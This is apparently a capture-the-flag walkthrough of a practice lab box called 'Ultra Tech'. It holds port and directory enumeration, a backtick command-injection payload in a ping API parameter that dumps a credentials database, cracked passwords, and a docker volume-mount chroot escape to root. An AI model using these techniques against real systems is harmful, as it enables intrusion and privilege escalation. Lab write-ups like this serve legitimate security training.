> Ultra Tech | Web App, PenTesting, Enum, PrivEsc

**export IP=10.10.248.29**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -on nmap/initial $IP

```
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    syn-ack ttl 63 Node.js Express framework
31331/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
```

# Gobuster - Port 8081

sudo gobuster -u http://$IP:8081 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -o gobuster/initial -t 20 -x php,txt,bak

```
/auth => Requires a login and password
```

# Gobuster - Port 31331

sudo gobuster -u http://10.10.248.29:31331/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 20 -o gobuster/port_31331 -x php,txt,bak,sql

```
/robots.txt (Status: 200)
```

# Robots.txt - 31331

`/utech_sitemap.txt`

It has 3 contents

```
/
/index.html
/what.html
/partners.html => we have js/api.js
```

And we have a function which we can ping

```
function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
```

We can ping `http://10.10.248.29:8081/ping?ip=10.8.107.21`.

Let's try to see the contents. When we navigate to `http://10.10.248.29:8081/ping?ip=`ls -la` `
we get an error response `ping: utech.db.sqlite: Name or service not known`

Navigating to `http://10.10.248.29:8081/ping?ip=`cat utech.db.sqlite` `

```
ping: )
���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
```

We can crack the `r00t` password `n100906` and `admin` password `mrsheafy`

In partners.html let's try to login. We can login as `admin`.

And we have a message

```
Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!

lp1
```

We can SSH using r00t. 

id => `uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)`

Looking at GTFO bins we have `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`. It failed as the image was not found locally. BUt looking at docker process.

docker ps -a => we have bash image

`docker run -v /:/mnt --rm -it bash chroot /mnt sh`

And now we are root!!